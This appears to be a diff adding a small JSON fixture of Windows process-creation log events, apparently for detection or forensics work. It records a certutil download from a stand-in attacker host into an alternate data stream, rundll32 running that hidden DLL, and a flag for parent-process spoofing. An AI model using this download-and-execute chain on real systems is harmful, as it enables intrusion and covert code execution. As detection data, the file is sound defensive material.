@@ -1,0 +1,21 @@
+[
+  {
+    "Timestamp": "2026-10-03T16:00:10Z",
+    "ProcessId": 7104,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f https://attacker-infra.org/blob.dat C:\\Users\\exec\\Documents\\notes.txt:blob.dll",
+    "ParentProcessId": 4012,
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\exec_vp"
+  },
+  {
+    "Timestamp": "2026-10-03T16:00:25Z",
+    "ProcessId": 8290,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe C:\\Users\\exec\\Documents\\notes.txt:blob.dll,EntryPoint",
+    "ReportedParentProcessId": 1104,
+    "ReportedParentImage": "C:\\Windows\\explorer.exe",
+    "ActualCreatorProcessId": 7104,
+    "Notes": "PPID Spoofing detected"
+  }
+]
